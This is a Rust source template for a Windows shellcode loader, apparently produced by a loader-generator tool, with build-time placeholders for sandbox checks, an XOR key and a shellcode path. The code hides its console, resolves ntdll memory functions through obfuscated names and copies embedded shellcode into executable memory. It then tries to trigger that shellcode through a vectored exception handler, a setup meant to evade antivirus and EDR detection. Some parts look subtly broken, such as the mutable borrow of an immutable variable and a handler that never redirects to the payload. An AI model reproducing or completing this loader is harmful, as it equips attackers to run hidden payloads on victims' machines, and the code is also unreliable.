#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(dead_code)]

{{LITCRYPT_SETUP}}
{{COMMON_MODULE}}

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_EXECUTE_HANDLER},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        errhandlingapi::EXCEPTION_POINTERS,
    },
    shared::ntdef::NT_SUCCESS,
    ctypes::c_void,
};

use std::include_bytes;

{{IMPORTS}}

mod memory;
mod cfg;
mod veh;

use memory::{set_memory_protection, MemoryProtection};
use cfg::{encode_pointer, get_process_cookie};
use veh::{add_veh_handler, trigger_exception};

// Placeholders for obfuscated functions
const OBF_NT_ALLOCATE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_NT_WRITE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
const OBF_NT_PROTECT_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};

const K: u8 = {{API_KEY}};

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let ntdll = CString::new(lc!("ntdll")).unwrap();
    let h = GetModuleHandleA(ntdll.as_ptr());
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
    HANDLE,
    *mut *mut c_void,
    usize,
    *mut usize,
    u32,
    u32,
) -> i32;
type FnNtWriteVirtualMemory = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    *mut c_void,
    usize,
    *mut usize,
) -> i32;
type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    HANDLE,
    *mut *mut c_void,
    *mut usize,
    u32,
    *mut u32,
) -> i32;

fn allocate_and_write_shellcode(buf: &[u8]) -> Option<*mut c_void> {
    let current_process: isize = -1;

    unsafe {
        let f_alloc: FnNtAllocateVirtualMemory = std::mem::transmute(g(OBF_NT_ALLOCATE_VIRTUAL_MEMORY));
        let f_write: FnNtWriteVirtualMemory = std::mem::transmute(g(OBF_NT_WRITE_VIRTUAL_MEMORY));

        let mut base: *mut c_void = std::ptr::null_mut();
        let mut size: usize = buf.len();

        let status = f_alloc(
            current_process as _,
            &mut base,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if !NT_SUCCESS(status) {
            return None;
        }

        let mut written: usize = 0;
        let status = f_write(
            current_process as _,
            base,
            buf.as_ptr() as *mut c_void,
            buf.len(),
            &mut written,
        );

        if !NT_SUCCESS(status) {
            return None;
        }

        Some(base)
    }
}

fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
    let current_process: isize = -1;

    unsafe {
        let f_protect: FnNtProtectVirtualMemory = std::mem::transmute(g(OBF_NT_PROTECT_VIRTUAL_MEMORY));

        let mut old_protect: u32 = 0;
        let mut region_size = size;

        let status = f_protect(
            current_process as _,
            &mut address,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        NT_SUCCESS(status)
    }
}

/// Handler for VEH-based execution
extern "system" fn veh_handler(_exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    EXCEPTION_EXECUTE_HANDLER
}

fn execute_via_veh(mut buf: Vec<u8>) {
    let base = allocate_and_write_shellcode(&buf);
    if base.is_none() {
        return;
    }

    let base = base.unwrap();
    common::wipe(&mut buf);

    if !change_protection_to_rx(base, buf.len()) {
        return;
    }

    if add_veh_handler(veh_handler, true).is_some() {
        trigger_exception();
    }
}

fn check_environment() -> bool {
    {{SANDBOX}}
    true
}

fn main() {
    {{SANDBOX}}

    if !check_environment() {
        return;
    }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    execute_via_veh(vec);
}

{{DLL_MAIN}}
